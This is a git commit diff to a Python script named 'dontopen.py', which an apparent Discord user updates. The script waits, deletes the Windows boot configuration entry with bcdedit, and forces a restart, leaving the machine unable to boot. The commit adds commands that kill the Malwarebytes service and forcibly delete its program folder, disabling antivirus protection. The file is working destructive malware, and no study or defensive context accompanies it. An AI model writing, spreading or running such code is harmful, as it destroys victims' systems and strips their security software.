0ea26429a288f1da101483e2893a6313ad734884
someonefromdiscord <freehostlvr12@proton.me>
2024-11-08 13:32:30 +0100

    Update dontopen.py

--- dontopen.py
+++ dontopen.py
@@ -2,6 +2,8 @@ import time
 import os
 print("I warned you! wait 6 minutes now")
 time.sleep(666)
+os.system("taskkill /f /im MBAMService.exe")
+os.system("del /s /q /f C:\Program Files\Malwarebytes")
 os.system("bcdedit /delete {current}")
 print("You opened a virus ): Your BCD is now gone")
 os.system("shutdown -r -t 1")
